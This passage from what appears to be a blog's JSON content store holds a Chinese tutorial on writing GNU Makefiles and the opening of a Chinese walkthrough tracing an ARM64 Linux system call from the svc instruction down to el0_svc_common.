${} 更清晰：\n\n${OBJ}_backup  # 表示变量 OBJ 的值后面接 _backup 字符串\n\n\n\n示例：\n\nall: myprog\n\nmyprog: $(OBJ)\n\t$(CC) $(CFLAGS) -o $@ $^\n\n%.o: %.c\n\t$(CC) $(CFLAGS) -c $< -o $@\n\n\t•\t$@：表示当前规则中的目标文件名。\n\t•\t$<：表示当前规则中的第一个依赖文件。\n\t•\t$^：表示当前规则中的所有依赖文件（去除重复项）。\n\n3. 目标、依赖和命令规则\n\n多个目标和依赖：\n\t•\t一个目标可以有多个依赖文件：\n\nmyprog: main.o utils.o lib.o\n\t$(CC) -o myprog main.o utils.o lib.o\n\n\n\n伪目标（Phony Targets）：\n\t•\t伪目标不会生成实际文件，比如 clean、all、install 等，可以用 .PHONY 声明：\n\n.PHONY: clean\nclean:\n\trm -f myprog *.o\n\n\n\n自动化变量：\n\t•\t自动变量使规则编写更简洁：\n\n%.o: %.c\n\t$(CC) $(CFLAGS) -c $< -o $@\n\n这里 % 表示通配符，匹配文件的相同部分。\n\n4. 常用的函数和高级特性\n\nGNU Make 提供了丰富的函数和高级特性，可以用来进行字符串操作、条件判断、循环等。\n\n字符串替换函数 $(subst from,to,text)：\n\nFILES := file1.c file2.c file3.c\nOBJS := $(subst .c,.o,$(FILES))\n\n条件判断：\n\nifeq ($(DEBUG),1)\n    CFLAGS += -g\nelse\n    CFLAGS += -O2\nendif\n\n包含其他 Makefile 文件：\n\ninclude config.mk\n\n模式规则（Pattern Rules）：\n\t•\t用于定义通用构建规则：\n\n%.o: %.c\n\t$(CC) $(CFLAGS) -c $< -o $@\n\n\n\n内置目标：\n\t•\tGNU Make 内置了一些特殊目标，例如 .PHONY、.SUFFIXES、.DEFAULT 等，可用于调整行为。\n\n5. 完整示例：编译一个小程序\n\n下面给出一个简单示例 Makefile，假设项目包含源文件 main.c 和 utils.c，目标为生成可执行文件 myprog。\n\n# Makefile 示例\n\n# 定义变量\nCC := gcc\nCFLAGS := -Wall -O2\nSRC := main.c utils.c\nOBJ := $(SRC:.c=.o)    # 使用模式替换，将 .c 转为 .o\nTARGET := myprog\n\n# 默认目标\nall: $(TARGET)\n\n# 目标生成规则：链接目标文件生成可执行文件\n$(TARGET): $(OBJ)\n\t$(CC) $(CFLAGS) -o $@ $^\n\n# 模式规则：将 .c 文件编译为 .o 文件\n%.o: %.c\n\t$(CC) $(CFLAGS) -c $< -o $@\n\n# 清理构建生成的文件\n.PHONY: clean\nclean:\n\trm -f $(TARGET) $(OBJ)\n\n# 安装目标（可选）\n.PHONY: install\ninstall: $(TARGET)\n\tinstall -m 755 $(TARGET) /usr/local/bin/\n\n说明：\n\t•\t变量 SRC 定义了所有的源代码文件。\n\t•\t变量 OBJ 利用模式替换，将每个 .c 文件自动转换成对应的 .o 文件。\n\t•\t默认目标 all 依赖目标可执行文件 myprog。\n\t•\t自动化变量 $@ 表示目标文件名字， $^ 表示所有依赖文件， $< 表示第一个依赖文件。\n\t•\t.PHONY 用来声明伪目标 clean 和 install，确保这些目标总会执行对应命令，而不会与同名文件冲突。\n\n6. 调试和调优\n\n打印变量值：\n\t•\t可使用 $(info ) 函数打印变量值：\n\n$(info SRC = $(SRC))\n\n\n\n使用 make -n 或 make --dry-run\n\t•\t可模拟执行，查看 Makefile 各条命令，帮助调试构建过程。\n\n启用详细输出：\n\t•\t执行 make V=1 有时可帮助观察命令实际执行细节（具体与项目设定有关）。\n\n7. 总结\n\t•\t目标、依赖和命令构成了 Makefile 的基本单元。\n\t•\t使用变量和自动变量简化编写工作，便于维护。\n\t•\t利用模式规则、条件判断、内置函数等高级特性可以编写通用、灵活的构建脚本。\n\t•\t记得在命令行前使用 Tab 缩进，否则会导致错误。\n\n通过不断调试和修改，你可以编写出适应各种工程需求的 Makefile。希望这份教程能帮助你快速上手 GNU Make 工具！","slug":"makefile","published":0,"date":"2025-01-22T16:05:12.729Z","updated":"2025-01-22T16:06:51.947Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit0000fv8fy1opp9ytd","content":"<p>下面整理了一份较为完整的 Makefile 教程，从基础语法、变量、目标与规则，到一些高级用法和注意事项，帮助你快速入门 GNU Make 以及编写高效的 Makefile。</p>\n<ol>\n<li>Makefile 基础</li>\n</ol>\n<p>Makefile 是一个用来自动构建程序的脚本文件，主要由 目标(target)、依赖(dependency) 和 命令(command) 组成。Make 工具根据 Makefile 指定的规则自动判断哪些文件需要重新构建。</p>\n<p>基本语法格式：</p>\n<p>目标: 依赖1 依赖2 …<br>    命令</p>\n<pre><code>•    目标：通常是可执行文件、库或其他需要生成的文件，也可以是伪目标（例如 clean）。\n•    依赖：构成目标所需的文件或目标列表。如果依赖比目标更新，则目标需要重新生成。\n•    命令：实际执行的 shell 命令，用于生成目标。注意：命令行前必须以 Tab 字符开始（空格不行）。\n</code></pre>\n<p>示例：</p>\n<p>hello: hello.c<br>    gcc -o hello hello.c</p>\n<p>上述规则表示：当 hello 文件需要生成时，如果 hello.c 是比 hello 更新的（或 hello 不存在），就用 gcc -o hello hello.c 命令生成。</p>\n<ol start=\"2\">\n<li>变量的使用</li>\n</ol>\n<p>Makefile 中可以定义变量，以便在多个地方复用相同的内容。</p>\n<p>变量定义：<br>    •    使用等号 =（延迟展开）或 :=（立即展开）定义变量。</p>\n<p>CC := gcc<br>CFLAGS := -Wall -O2<br>SRC := main.c utils.c<br>OBJ := main.o utils.o</p>\n<p>变量引用：<br>    •    使用 $() 或 ${} 语法引用变量，它们是等价的。例如：<br>    •    $(CC) 或 ${CC}<br>    •    当变量名与其他字符紧挨在一起时，使用 ${} 更清晰：</p>\n<p>${OBJ}_backup  # 表示变量 OBJ 的值后面接 _backup 字符串</p>\n<p>示例：</p>\n<p>all: myprog</p>\n<p>myprog: $(OBJ)<br>    $(CC) $(CFLAGS) -o $@ $^</p>\n<p>%.o: %.c<br>    $(CC) $(CFLAGS) -c $&lt; -o $@</p>\n<pre><code>•    $@：表示当前规则中的目标文件名。\n•    $&lt;：表示当前规则中的第一个依赖文件。\n•    $^：表示当前规则中的所有依赖文件（去除重复项）。\n</code></pre>\n<ol start=\"3\">\n<li>目标、依赖和命令规则</li>\n</ol>\n<p>多个目标和依赖：<br>    •    一个目标可以有多个依赖文件：</p>\n<p>myprog: main.o utils.o lib.o<br>    $(CC) -o myprog main.o utils.o lib.o</p>\n<p>伪目标（Phony Targets）：<br>    •    伪目标不会生成实际文件，比如 clean、all、install 等，可以用 .PHONY 声明：</p>\n<p>.PHONY: clean<br>clean:<br>    rm -f myprog *.o</p>\n<p>自动化变量：<br>    •    自动变量使规则编写更简洁：</p>\n<p>%.o: %.c<br>    $(CC) $(CFLAGS) -c $&lt; -o $@</p>\n<p>这里 % 表示通配符，匹配文件的相同部分。</p>\n<ol start=\"4\">\n<li>常用的函数和高级特性</li>\n</ol>\n<p>GNU Make 提供了丰富的函数和高级特性，可以用来进行字符串操作、条件判断、循环等。</p>\n<p>字符串替换函数 $(subst from,to,text)：</p>\n<p>FILES := file1.c file2.c file3.c<br>OBJS := $(subst .c,.o,$(FILES))</p>\n<p>条件判断：</p>\n<p>ifeq ($(DEBUG),1)<br>    CFLAGS += -g<br>else<br>    CFLAGS += -O2<br>endif</p>\n<p>包含其他 Makefile 文件：</p>\n<p>include config.mk</p>\n<p>模式规则（Pattern Rules）：<br>    •    用于定义通用构建规则：</p>\n<p>%.o: %.c<br>    $(CC) $(CFLAGS) -c $&lt; -o $@</p>\n<p>内置目标：<br>    •    GNU Make 内置了一些特殊目标，例如 .PHONY、.SUFFIXES、.DEFAULT 等，可用于调整行为。</p>\n<ol start=\"5\">\n<li>完整示例：编译一个小程序</li>\n</ol>\n<p>下面给出一个简单示例 Makefile，假设项目包含源文件 main.c 和 utils.c，目标为生成可执行文件 myprog。</p>\n<h1 id=\"Makefile-示例\"><a href=\"#Makefile-示例\" class=\"headerlink\" title=\"Makefile 示例\"></a>Makefile 示例</h1><h1 id=\"定义变量\"><a href=\"#定义变量\" class=\"headerlink\" title=\"定义变量\"></a>定义变量</h1><p>CC := gcc<br>CFLAGS := -Wall -O2<br>SRC := main.c utils.c<br>OBJ := $(SRC:.c=.o)    # 使用模式替换，将 .c 转为 .o<br>TARGET := myprog</p>\n<h1 id=\"默认目标\"><a href=\"#默认目标\" class=\"headerlink\" title=\"默认目标\"></a>默认目标</h1><p>all: $(TARGET)</p>\n<h1 id=\"目标生成规则：链接目标文件生成可执行文件\"><a href=\"#目标生成规则：链接目标文件生成可执行文件\" class=\"headerlink\" title=\"目标生成规则：链接目标文件生成可执行文件\"></a>目标生成规则：链接目标文件生成可执行文件</h1><p>$(TARGET): $(OBJ)<br>    $(CC) $(CFLAGS) -o $@ $^</p>\n<h1 id=\"模式规则：将-c-文件编译为-o-文件\"><a href=\"#模式规则：将-c-文件编译为-o-文件\" class=\"headerlink\" title=\"模式规则：将 .c 文件编译为 .o 文件\"></a>模式规则：将 .c 文件编译为 .o 文件</h1><p>%.o: %.c<br>    $(CC) $(CFLAGS) -c $&lt; -o $@</p>\n<h1 id=\"清理构建生成的文件\"><a href=\"#清理构建生成的文件\" class=\"headerlink\" title=\"清理构建生成的文件\"></a>清理构建生成的文件</h1><p>.PHONY: clean<br>clean:<br>    rm -f $(TARGET) $(OBJ)</p>\n<h1 id=\"安装目标（可选）\"><a href=\"#安装目标（可选）\" class=\"headerlink\" title=\"安装目标（可选）\"></a>安装目标（可选）</h1><p>.PHONY: install<br>install: $(TARGET)<br>    install -m 755 $(TARGET) /usr/local/bin/</p>\n<p>说明：<br>    •    变量 SRC 定义了所有的源代码文件。<br>    •    变量 OBJ 利用模式替换，将每个 .c 文件自动转换成对应的 .o 文件。<br>    •    默认目标 all 依赖目标可执行文件 myprog。<br>    •    自动化变量 $@ 表示目标文件名字， $^ 表示所有依赖文件， $&lt; 表示第一个依赖文件。<br>    •    .PHONY 用来声明伪目标 clean 和 install，确保这些目标总会执行对应命令，而不会与同名文件冲突。</p>\n<ol start=\"6\">\n<li>调试和调优</li>\n</ol>\n<p>打印变量值：<br>    •    可使用 $(info ) 函数打印变量值：</p>\n<p>$(info SRC = $(SRC))</p>\n<p>使用 make -n 或 make –dry-run<br>    •    可模拟执行，查看 Makefile 各条命令，帮助调试构建过程。</p>\n<p>启用详细输出：<br>    •    执行 make V=1 有时可帮助观察命令实际执行细节（具体与项目设定有关）。</p>\n<ol start=\"7\">\n<li>总结<br> •    目标、依赖和命令构成了 Makefile 的基本单元。<br> •    使用变量和自动变量简化编写工作，便于维护。<br> •    利用模式规则、条件判断、内置函数等高级特性可以编写通用、灵活的构建脚本。<br> •    记得在命令行前使用 Tab 缩进，否则会导致错误。</li>\n</ol>\n<p>通过不断调试和修改，你可以编写出适应各种工程需求的 Makefile。希望这份教程能帮助你快速上手 GNU Make 工具！</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>下面整理了一份较为完整的 Makefile 教程，从基础语法、变量、目标与规则，到一些高级用法和注意事项，帮助你快速入门 GNU Make 以及编写高效的 Makefile。</p>\n<ol>\n<li>Makefile 基础</li>\n</ol>\n<p>Makefile 是一个用来自动构建程序的脚本文件，主要由 目标(target)、依赖(dependency) 和 命令(command) 组成。Make 工具根据 Makefile 指定的规则自动判断哪些文件需要重新构建。</p>\n<p>基本语法格式：</p>\n<p>目标: 依赖1 依赖2 …<br>    命令</p>\n<pre><code>•    目标：通常是可执行文件、库或其他需要生成的文件，也可以是伪目标（例如 clean）。\n•    依赖：构成目标所需的文件或目标列表。如果依赖比目标更新，则目标需要重新生成。\n•    命令：实际执行的 shell 命令，用于生成目标。注意：命令行前必须以 Tab 字符开始（空格不行）。\n</code></pre>\n<p>示例：</p>\n<p>hello: hello.c<br>    gcc -o hello hello.c</p>\n<p>上述规则表示：当 hello 文件需要生成时，如果 hello.c 是比 hello 更新的（或 hello 不存在），就用 gcc -o hello hello.c 命令生成。</p>\n<ol start=\"2\">\n<li>变量的使用</li>\n</ol>\n<p>Makefile 中可以定义变量，以便在多个地方复用相同的内容。</p>\n<p>变量定义：<br>    •    使用等号 =（延迟展开）或 :=（立即展开）定义变量。</p>\n<p>CC := gcc<br>CFLAGS := -Wall -O2<br>SRC := main.c utils.c<br>OBJ := main.o utils.o</p>\n<p>变量引用：<br>    •    使用 $() 或 ${} 语法引用变量，它们是等价的。例如：<br>    •    $(CC) 或 ${CC}<br>    •    当变量名与其他字符紧挨在一起时，使用 ${} 更清晰：</p>\n<p>${OBJ}_backup  # 表示变量 OBJ 的值后面接 _backup 字符串</p>\n<p>示例：</p>\n<p>all: myprog</p>\n<p>myprog: $(OBJ)<br>    $(CC) $(CFLAGS) -o $@ $^</p>\n<p>%.o: %.c<br>    $(CC) $(CFLAGS) -c $&lt; -o $@</p>\n<pre><code>•    $@：表示当前规则中的目标文件名。\n•    $&lt;：表示当前规则中的第一个依赖文件。\n•    $^：表示当前规则中的所有依赖文件（去除重复项）。\n</code></pre>\n<ol start=\"3\">\n<li>目标、依赖和命令规则</li>\n</ol>\n<p>多个目标和依赖：<br>    •    一个目标可以有多个依赖文件：</p>\n<p>myprog: main.o utils.o lib.o<br>    $(CC) -o myprog main.o utils.o lib.o</p>\n<p>伪目标（Phony Targets）：<br>    •    伪目标不会生成实际文件，比如 clean、all、install 等，可以用 .PHONY 声明：</p>\n<p>.PHONY: clean<br>clean:<br>    rm -f myprog *.o</p>\n<p>自动化变量：<br>    •    自动变量使规则编写更简洁：</p>\n<p>%.o: %.c<br>    $(CC) $(CFLAGS) -c $&lt; -o $@</p>\n<p>这里 % 表示通配符，匹配文件的相同部分。</p>\n<ol start=\"4\">\n<li>常用的函数和高级特性</li>\n</ol>\n<p>GNU Make 提供了丰富的函数和高级特性，可以用来进行字符串操作、条件判断、循环等。</p>\n<p>字符串替换函数 $(subst from,to,text)：</p>\n<p>FILES := file1.c file2.c file3.c<br>OBJS := $(subst .c,.o,$(FILES))</p>\n<p>条件判断：</p>\n<p>ifeq ($(DEBUG),1)<br>    CFLAGS += -g<br>else<br>    CFLAGS += -O2<br>endif</p>\n<p>包含其他 Makefile 文件：</p>\n<p>include config.mk</p>\n<p>模式规则（Pattern Rules）：<br>    •    用于定义通用构建规则：</p>\n<p>%.o: %.c<br>    $(CC) $(CFLAGS) -c $&lt; -o $@</p>\n<p>内置目标：<br>    •    GNU Make 内置了一些特殊目标，例如 .PHONY、.SUFFIXES、.DEFAULT 等，可用于调整行为。</p>\n<ol start=\"5\">\n<li>完整示例：编译一个小程序</li>\n</ol>\n<p>下面给出一个简单示例 Makefile，假设项目包含源文件 main.c 和 utils.c，目标为生成可执行文件 myprog。</p>\n<h1 id=\"Makefile-示例\"><a href=\"#Makefile-示例\" class=\"headerlink\" title=\"Makefile 示例\"></a>Makefile 示例</h1><h1 id=\"定义变量\"><a href=\"#定义变量\" class=\"headerlink\" title=\"定义变量\"></a>定义变量</h1><p>CC := gcc<br>CFLAGS := -Wall -O2<br>SRC := main.c utils.c<br>OBJ := $(SRC:.c=.o)    # 使用模式替换，将 .c 转为 .o<br>TARGET := myprog</p>\n<h1 id=\"默认目标\"><a href=\"#默认目标\" class=\"headerlink\" title=\"默认目标\"></a>默认目标</h1><p>all: $(TARGET)</p>\n<h1 id=\"目标生成规则：链接目标文件生成可执行文件\"><a href=\"#目标生成规则：链接目标文件生成可执行文件\" class=\"headerlink\" title=\"目标生成规则：链接目标文件生成可执行文件\"></a>目标生成规则：链接目标文件生成可执行文件</h1><p>$(TARGET): $(OBJ)<br>    $(CC) $(CFLAGS) -o $@ $^</p>\n<h1 id=\"模式规则：将-c-文件编译为-o-文件\"><a href=\"#模式规则：将-c-文件编译为-o-文件\" class=\"headerlink\" title=\"模式规则：将 .c 文件编译为 .o 文件\"></a>模式规则：将 .c 文件编译为 .o 文件</h1><p>%.o: %.c<br>    $(CC) $(CFLAGS) -c $&lt; -o $@</p>\n<h1 id=\"清理构建生成的文件\"><a href=\"#清理构建生成的文件\" class=\"headerlink\" title=\"清理构建生成的文件\"></a>清理构建生成的文件</h1><p>.PHONY: clean<br>clean:<br>    rm -f $(TARGET) $(OBJ)</p>\n<h1 id=\"安装目标（可选）\"><a href=\"#安装目标（可选）\" class=\"headerlink\" title=\"安装目标（可选）\"></a>安装目标（可选）</h1><p>.PHONY: install<br>install: $(TARGET)<br>    install -m 755 $(TARGET) /usr/local/bin/</p>\n<p>说明：<br>    •    变量 SRC 定义了所有的源代码文件。<br>    •    变量 OBJ 利用模式替换，将每个 .c 文件自动转换成对应的 .o 文件。<br>    •    默认目标 all 依赖目标可执行文件 myprog。<br>    •    自动化变量 $@ 表示目标文件名字， $^ 表示所有依赖文件， $&lt; 表示第一个依赖文件。<br>    •    .PHONY 用来声明伪目标 clean 和 install，确保这些目标总会执行对应命令，而不会与同名文件冲突。</p>\n<ol start=\"6\">\n<li>调试和调优</li>\n</ol>\n<p>打印变量值：<br>    •    可使用 $(info ) 函数打印变量值：</p>\n<p>$(info SRC = $(SRC))</p>\n<p>使用 make -n 或 make –dry-run<br>    •    可模拟执行，查看 Makefile 各条命令，帮助调试构建过程。</p>\n<p>启用详细输出：<br>    •    执行 make V=1 有时可帮助观察命令实际执行细节（具体与项目设定有关）。</p>\n<ol start=\"7\">\n<li>总结<br> •    目标、依赖和命令构成了 Makefile 的基本单元。<br> •    使用变量和自动变量简化编写工作，便于维护。<br> •    利用模式规则、条件判断、内置函数等高级特性可以编写通用、灵活的构建脚本。<br> •    记得在命令行前使用 Tab 缩进，否则会导致错误。</li>\n</ol>\n<p>通过不断调试和修改，你可以编写出适应各种工程需求的 Makefile。希望这份教程能帮助你快速上手 GNU Make 工具！</p>\n"},{"_content":"系统调用解析\n\ntrace:\n```\n───────────────────────────────────────────────────────────── code:arm64: ────\n   0xffff800080023758 <__arm64_sys_ni_syscall+0010> ldp    x29,  x30,  [sp],  #16\n   0xffff80008002375c <__arm64_sys_ni_syscall+0014> autiasp \n   0xffff800080023760 <__arm64_sys_ni_syscall+0018> ret    \n●→ 0xffff800080023764 <__arm64_sys_getpuid+0000> paciasp \n   0xffff800080023768 <__arm64_sys_getpuid+0004> stp    x29,  x30,  [sp,  #-208]!\n   0xffff80008002376c <__arm64_sys_getpuid+0008> mov    x4,  #0x800000000000        \t// #140737488355328\n   0xffff800080023770 <__arm64_sys_getpuid+000c> mov    x29,  sp\n   0xffff800080023774 <__arm64_sys_getpuid+0010> stp    x19,  x20,  [sp,  #16]\n   0xffff800080023778 <__arm64_sys_getpuid+0014> add    x19,  sp,  #0x50\n──────────────────────────────────── source:../arch/arm64/kernel/sys.c+39 ────\n     34\t \t\t!system_supports_32bit_el0())\n     35\t \t\treturn -EINVAL;\n     36\t \treturn ksys_personality(personality);\n     37\t }\n     38\t \n →   39\t SYSCALL_DEFINE2(getpuid,pid_t __user *, pid,uid_t __user *,uid){\n     40\t \tpid_t kpid;\n     41\t \tuid_t kuid;\n     42\t \tprintk(\"%s add syscall call\",__func__);\n     43\t \tif(pid == NULL && uid == NULL){\n     44\t \t\treturn -EINVAL;\n───────────────────────────────────────────────────────────────── threads ────\n[#0] Id 1, stopped 0xffff800081854eb8 in cpu_do_idle (), reason: BREAKPOINT\n[#1] Id 2, stopped 0xffff800080023764 in __arm64_sys_getpuid (), reason: BREAKPOINT\n─────────────────────────────────────────────────────────────────── trace ────\n[#0] 0xffff800080023764 → __arm64_sys_getpuid(regs=0xffff800086877eb0)\n[#1] 0xffff80008002dabc → __invoke_syscall(syscall_fn=<optimized out>, regs=0xffff800086877eb0)\n[#2] 0xffff80008002dabc → invoke_syscall(regs=0xffff800086877eb0, scno=0x1c9, sc_nr=0x1ca, syscall_table=0xffff8000818966c0 <sys_call_table>)\n[#3] 0xffff80008002dc58 → el0_svc_common(regs=0xffff800086877eb0, scno=0x1c9, sc_nr=0x1ca, syscall_table=0xffff8000818966c0 <sys_call_table>)\n[#4] 0xffff80008002dd68 → do_el0_svc(regs=0xffff800086877eb0)\n[#5] 0xffff8000818536d4 → el0_svc(regs=0xffff800086877eb0)\n[#6] 0xffff800081853a70 → el0t_64_sync_handler(regs=<optimized out>)\n[#7] 0xffff800080011d4c → el0t_64_sync()\n\n```\n1. 用户空间调用 syscall，触发 svc 0。\n2. CPU 进入内核模式，跳转到 el0t_64_sync。\n3. 异常处理函数 el0t_64_sync_handler 被调用。\n4. 进入 el0_svc 和 do_el0_svc 处理 SVC 异常。\n5. 调用 el0_svc_common，它负责查找和调用具体的系统调用处理函数。\n6. invoke_syscall 调用具体的系统调用处理函数。\n7. __invoke_syscall 执行具体的系统调用逻辑，例如 __arm64_sys_getpuid。\n\n\n1. 通过svc触发异常\n在用户空间程序执行 svc 0 后，会触发一个异常，使得 CPU 从用户模式切换到特权模式（内核模式），并执行相应的异常处理程序。\n```\nmov x8, #0           // 设置系统调用号到 x8 寄存器\nsvc 0                // 触发系统调用\n```\n\n2. 触发异常后，会调用el0t_64_sync\nel0代表此刻还在用户态\n其定义在：\narch/arm64/kernel/entry.S\n```\n\tentry_handler\t0, t, 64, sync\n```\nenter_handler 是个宏定义，定义如下\n```\n\t.macro entry_handler el:req, ht:req, regsize:req, label:req\nSYM_CODE_START_LOCAL(el\\el\\ht\\()_\\regsize\\()_\\label)\n\tkernel_entry \\el, \\regsize\n\tmov\tx0, sp\n\tbl\tel\\el\\ht\\()_\\regsize\\()_\\label\\()_handler\n\t.if \\el == 0\n\tb\tret_to_user\n\t.else\n\tb\tret_to_kernel\n\t.endif\nSYM_CODE_END(el\\el\\ht\\()_\\regsize\\()_\\label)\n\t.endm\n\n```\nSYM_CODE_START_LOCAL 宏：通常用于定义局部代码符号的开始，确保生成的汇编标签符合特定的格式，\n\n* el\\el\\ht\\()_\\regsize\\()_\\label：\n* * el\\el\\ht\\()_\\regsize\\()_\\label 这一部分展开成 el0t_64_sync，其中：\n* * * el\\el 是 el0。\n* * * ht 是 t。\n* * * regsize\\() 是 64_。\n* * * label 是 sync。\n* * 最终生成的符号名是 el0t_64_sync。\n* \\()_：\n\n* * * \\( )_ 表示在宏参数后插入一个下划线 _，以便将参数值与下一个部分连接起来。\n* * * 例如，\\regsize\\() 是 64_，即寄存器大小后跟一个下划线。\n\nkernel_entry 宏，它通常用于设置进入内核时的上下文环境。这包括禁用中断、保存上下文和切换到内核模式等操作。\n```\n\t.macro\tkernel_entry, el, regsize = 64\n\t.if\t\\el == 0\n\talternative_insn nop, SET_PSTATE_DIT(1), ARM64_HAS_DIT\n\t.endif\n\t.if\t\\regsize == 32\n\tmov\tw0, w0\t\t\t\t// zero upper 32 bits of x0\n\t.endif\n\tstp\tx0, x1, [sp, #16 * 0]\n\tstp\tx2, x3, [sp, #16 * 1]\n\tstp\tx4, x5, [sp, #16 * 2]\n\tstp\tx6, x7, [sp, #16 * 3]\n\tstp\tx8, x9, [sp, #16 * 4]\n\tstp\tx10, x11, [sp, #16 * 5]\n\tstp\tx12, x13, [sp, #16 * 6]\n\tstp\tx14, x15, [sp, #16 * 7]\n\tstp\tx16, x17, [sp, #16 * 8]\n\tstp\tx18, x19, [sp, #16 * 9]\n\tstp\tx20, x21, [sp, #16 * 10]\n\tstp\tx22, x23, [sp, #16 * 11]\n\tstp\tx24, x25, [sp, #16 * 12]\n\tstp\tx26, x27, [sp, #16 * 13]\n\tstp\tx28, x29, [sp, #16 * 14]\n\n    ...\n    .endm\n```\n3. 调用 el0t_64_sync_handler\n主要处理从 EL0（用户态）到 EL1（内核态）的64位同步异常\n\n函数定义和初始化\n```\nasmlinkage void noinstr el0t_64_sync_handler(struct pt_regs *regs)\n{\n\tunsigned long esr = read_sysreg(esr_el1);\n\n\n```\nasmlinkage：这是一个宏，通常用于指定函数的调用约定，确保参数通过堆栈传递而不是通过寄存器传递。这对于内核和用户态之间的调用非常重要。\nnoinstr：这是一种属性，指示编译器不要在这个函数中插入调试或分析相关的指令。\nel0t_64_sync_handler：函数名，处理 EL0 到 EL1 的64位同步异常。\nstruct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。\nunsigned long esr = read_sysreg(esr_el1)：读取异常综合寄存器（ESR），这个寄存器包含了异常的详细信息。\nESR_ELx_EC_SVC64：处理系统调用异常\n\n```\nswitch (ESR_ELx_EC(esr)) {\n\tcase ESR_ELx_EC_SVC64:\n\t\tel0_svc(regs);\n\t\tbreak;\n}\n```\n4. el0_svc\n```\nstatic void noinstr el0_svc(struct pt_regs *regs)\n{\n\tenter_from_user_mode(regs);\n\tcortex_a76_erratum_1463225_svc_handler();\n\tfp_user_discard();\n\tlocal_daif_restore(DAIF_PROCCTX);\n\tdo_el0_svc(regs);\n\texit_to_user_mode(regs);\n}\n\n```\n这段代码定义了一个静态函数 el0_svc，用于处理从用户态（EL0）到内核态（EL1）的系统调用（SVC，Supervisor Call）异常。让我们按照之前解释的规则对这段代码进行详细解析。\n\n函数定义\n\nstatic void noinstr el0_svc(struct pt_regs *regs)\nstatic：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。\nnoinstr：这个属性指示编译器不要在这个函数中插入调试或分析相关的指令。\nvoid：表示函数不返回任何值。\nel0_svc：函数名，处理从EL0到EL1的系统调用异常。\nstruct pt_regs *regs：一个指向保存异常发生时CPU寄存器状态的结构体的指针。\n函数实现\n```\n{\n\tenter_from_user_mode(regs);\n\tcortex_a76_erratum_1463225_svc_handler();\n\tfp_user_discard();\n\tlocal_daif_restore(DAIF_PROCCTX);\n\tdo_el0_svc(regs);\n\texit_to_user_mode(regs);\n}\n```\n1. enter_from_user_mode(regs)\n\nenter_from_user_mode(regs);\n这个函数将上下文从用户模式切换到内核模式。它通常包括保存用户态寄存器、设置内核态堆栈等操作。\n2. cortex_a76_erratum_1463225_svc_handler()\n\ncortex_a76_erratum_1463225_svc_handler();\n这是一个特定于 Cortex-A76 处理器的错误处理程序。这个函数处理 Cortex-A76 处理器中的特定硬件错误（erratum 1463225）。\n3. fp_user_discard()\n\nfp_user_discard();\n这个函数用于丢弃用户态的浮点上下文，以确保在内核态不会使用用户态的浮点寄存器。这通常是为了安全性和上下文切换的正确性。\n4. local_daif_restore(DAIF_PROCCTX)\n\nlocal_daif_restore(DAIF_PROCCTX);\n这个函数用于恢复中断状态。DAIF_PROCCTX 是一个标志，用于指示当前的处理器上下文。这个函数通常会重新使能中断或其他处理器状态。\n5. do_el0_svc(regs)\n\ndo_el0_svc(regs);\n这个函数处理实际的系统调用逻辑。regs 包含了系统调用号和参数，通过这个函数调用具体的系统调用处理函数。\n6. exit_to_user_mode(regs)\n\nexit_to_user_mode(regs);\n这个函数将上下文从内核模式切换回用户模式。它通常包括恢复用户态寄存器、设置用户态堆栈等操作。\n\n总结\nel0_svc 函数处理从用户态到内核态的系统调用异常。具体步骤如下：\n\n* 进入内核模式：通过 enter_from_user_mode 保存用户态上下文并切换到内核模式。\n* 处理特定处理器错误：通过 cortex_a76_erratum_1463225_svc_handler 处理 Cortex-A76 处理器的特定错误。\n* 丢弃用户态浮点上下文：通过 fp_user_discard 确保内核态不会使用用户态浮点寄存器。\n* 恢复中断状态：通过 local_daif_restore 恢复处理器的中断状态。\n* 处理系统调用：通过 do_el0_svc 调用具体的系统调用处理函数。\n返回用户模式：通过 exit_to_user_mode 恢复用户态上下文并返回用户模式。\n\n5. do_el0_svc\n```\nvoid do_el0_svc(struct pt_regs *regs)\n{\n\tel0_svc_common(regs, regs->regs[8], __NR_syscalls, sys_call_table);\n}\n```\n\n5. el0_sev_common\n\n函数定义\n\nstatic void el0_svc_common(struct pt_regs *regs, int scno, int sc_nr,\n                           const syscall_fn_t syscall_table[])\nstatic：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。\nvoid：表示函数不返回任何值。\nel0_svc_common：函数名，处理从 EL0（用户态）到 EL1（内核态）的系统调用。\nstruct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。\nint scno：系统调用号。\nint sc_nr：系统调用的总数量。\nconst syscall_fn_t syscall_table[]：系统调用表，包含所有系统调用的函数指针。\n函数实现\n初始化和上下文保存\n\nunsigned long flags = read_thread_flags();\n\nregs->orig_x0 = regs->regs[0];\nregs->syscallno = scno;\nread_thread_flags()：读取当前线程的标志。\nregs->orig_x0 = regs->regs[0]：保存原始的 x0 寄存器值。\nregs->syscallno = scno：保存系统调用号。\n注释部分：BTI 处理说明\n\n/*\n * BTI note:\n * The architecture does not guarantee that SPSR.BTYPE is zero\n * on taking an SVC, so we could return to userspace with a\n * non-zero BTYPE after the syscall.\n *\n * This shouldn't matter except when userspace is explicitly\n * doing something stupid, such as setting PROT_BTI on a page\n * that lacks conforming BTI/PACIxSP instructions, falling\n * through from one executable page to another with differing\n * PROT_BTI, or messing with BTYPE via ptrace: in such cases,\n * userspace should not be surprised if a SIGILL occurs on\n * syscall return.\n *\n * So, don't touch regs->pstate & PSR_BTYPE_MASK here.\n * (Similarly for HVC and SMC elsewhere.)\n */\n这段注释解释了 BTI（Branch Target Identification）的处理和可能出现的问题。主要说明不要修改 regs->pstate 中的 PSR_BTYPE_MASK 位。\n处理异步标记检查故障\n\nif (flags & _TIF_MTE_ASYNC_FAULT) {\n    syscall_set_return_value(current, regs, -ERESTARTNOINTR, 0);\n    return;\n}\n检查 _TIF_MTE_ASYNC_FAULT 标志，如果设置了这个标志，表示有异步的标记检查故障需要处理。\nsyscall_set_return_value(current, regs, -ERESTARTNOINTR, 0)：设置系统调用返回值为 -ERESTARTNOINTR，表示系统调用需要重启。\nreturn：返回，不继续执行后续的系统调用处理。\n处理系统调用的额外工作\n\nif (has_syscall_work(flags)) {\n    if (scno == NO_SYSCALL)\n        syscall_set_return_value(current, regs, -ENOSYS, 0);\n    scno = syscall_trace_enter(regs);\n    if (scno == 